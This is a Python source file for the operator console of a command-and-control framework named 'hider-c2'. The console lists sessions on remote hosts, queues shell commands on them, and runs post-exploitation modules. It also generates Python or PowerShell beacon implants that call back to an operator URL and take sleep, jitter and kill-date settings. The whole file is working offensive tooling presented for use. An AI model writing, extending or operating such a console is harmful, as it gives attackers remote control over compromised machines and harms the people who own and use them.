"""
c2/console.py — Operator Interactive Console

A readline-based interactive shell for managing C2 sessions,
queuing commands, running modules, and viewing results.
"""
import os
import sys
import readline

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from c2 import session
from c2.beacon_gen import BeaconGen
import modules


BANNER = r"""
  ╦ ╦╦╔╦╗╔═╗╦═╗  ╔═╗2
  ╠═╣║ ║║║╣ ╠╦╝  ║   
  ╩ ╩╩═╩╝╚═╝╩╚═  ╚═╝ 
  Command & Control Console
  Type 'help' for commands.
"""


class C2Console:

    def __init__(self):
        self.active_session = None
        self.running = True

    def start(self):
        print(BANNER)
        while self.running:
            try:
                prompt = f"\033[91mhider-c2\033[0m"
                if self.active_session:
                    prompt += f" (\033[92m{self.active_session}\033[0m)"
                prompt += " > "
                line = input(prompt).strip()
                if not line:
                    continue
                self._dispatch(line)
            except (KeyboardInterrupt, EOFError):
                print("\n[*] Exiting console.")
                self.running = False

    def _dispatch(self, line):
        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        commands = {
            'help':      self._help,
            'sessions':  self._sessions,
            'interact':  self._interact,
            'back':      self._back,
            'shell':     self._shell,
            'modules':   self._modules,
            'use':       self._use,
            'results':   self._results,
            'kill':      self._kill,
            'generate':  self._generate,
            'exit':      self._exit,
            'quit':      self._exit,
        }

        handler = commands.get(cmd)
        if handler:
            handler(args)
        else:
            print(f"[!] Unknown command: {cmd}. Type 'help'.")

    def _help(self, _):
        print("""
  sessions                         List all active sessions
  interact <session_id>            Select a session to interact with
  back                             Deselect current session
  shell <command>                  Queue a shell command on active session
  modules                          List available post-exploitation modules
  use <module> [args...]           Run a module on the active session
  results [session_id]             View command results
  kill <session_id>                Mark session as dead
  generate <python|powershell>     Generate a beacon implant
  exit / quit                      Exit the console
        """)

    def _sessions(self, _):
        sessions = session.list_sessions()
        if not sessions:
            print("[*] No sessions registered.")
            return
        print(f"\n  {'ID':<10} {'User':<15} {'Host':<15} {'OS':<20} {'IP':<16} {'Last Seen':<22} {'Status'}")
        print("  " + "-" * 108)
        for s in sessions:
            status_color = "\033[92m" if s['status'] == 'active' else "\033[91m"
            print(f"  {s['id']:<10} {s['username']:<15} {s['hostname']:<15} "
                  f"{(s['os'] or '')[:20]:<20} {s['ip']:<16} {s['last_seen']:<22} "
                  f"{status_color}{s['status']}\033[0m")
        print()

    def _interact(self, args):
        sid = args.strip()
        if not sid:
            print("[!] Usage: interact <session_id>")
            return
        s = session.get_session(sid)
        if not s:
            print(f"[!] Session '{sid}' not found.")
            return
        self.active_session = sid
        print(f"[*] Interacting with {sid} ({s['username']}@{s['hostname']})")

    def _back(self, _):
        self.active_session = None
        print("[*] Session deselected.")

    def _shell(self, args):
        if not self.active_session:
            print("[!] No active session. Use 'interact <id>' first.")
            return
        if not args.strip():
            print("[!] Usage: shell <command>")
            return
        session.queue_command(self.active_session, args.strip())
        print(f"[+] Command queued for {self.active_session}")

    def _modules(self, _):
        modules.discover()
        print("\n" + modules.list_modules() + "\n")

    def _use(self, args):
        if not self.active_session:
            print("[!] No active session. Use 'interact <id>' first.")
            return
        parts = args.split(maxsplit=1)
        mod_name = parts[0] if parts else ""
        mod_args = parts[1].split() if len(parts) > 1 else []

        if not mod_name:
            print("[!] Usage: use <module_name> [args...]")
            return

        sess = session.get_session(self.active_session)
        cmd = modules.run_module(mod_name, sess, mod_args)
        if cmd.startswith("[!]"):
            print(cmd)
        else:
            session.queue_command(self.active_session, cmd)
            print(f"[+] Module '{mod_name}' command queued for {self.active_session}")

    def _results(self, args):
        sid = args.strip() or self.active_session
        if not sid:
            print("[!] Usage: results [session_id]")
            return
        results = session.get_results(sid)
        if not results:
            print("[*] No results yet.")
            return
        for r in reversed(results):
            status_color = "\033[92m" if r['status'] == 'completed' else "\033[93m"
            print(f"\n  [{status_color}#{r['id']}\033[0m] ({r['status']}) $ {r['command']}")
            if r['result']:
                for line in r['result'].split('\n')[:20]:
                    print(f"    {line}")

    def _kill(self, args):
        sid = args.strip()
        if not sid:
            print("[!] Usage: kill <session_id>")
            return
        session.kill_session(sid)
        if self.active_session == sid:
            self.active_session = None
        print(f"[*] Session {sid} marked as dead.")

    def _generate(self, args):
        lang = args.strip() or "python"
        url = input("  C2 callback URL (e.g. http://10.0.0.1:8443): ").strip()
        sleep = int(input("  Sleep interval in seconds [5]: ").strip() or "5")
        jitter = int(input("  Jitter percentage [20]: ").strip() or "20")
        kill = input("  Kill date (YYYY-MM-DD or blank): ").strip() or None
        ext = ".py" if lang == "python" else ".ps1"
        out = input(f"  Output path [beacon{ext}]: ").strip() or f"beacon{ext}"

        code = BeaconGen.generate(url, lang=lang, sleep_sec=sleep, jitter_pct=jitter, kill_date=kill)
        with open(out, 'w') as f:
            f.write(code)
        print(f"[+] Beacon written to {out}")

    def _exit(self, _):
        print("[*] Goodbye.")
        self.running = False


def main():
    console = C2Console()
    console.start()


if __name__ == '__main__':
    main()
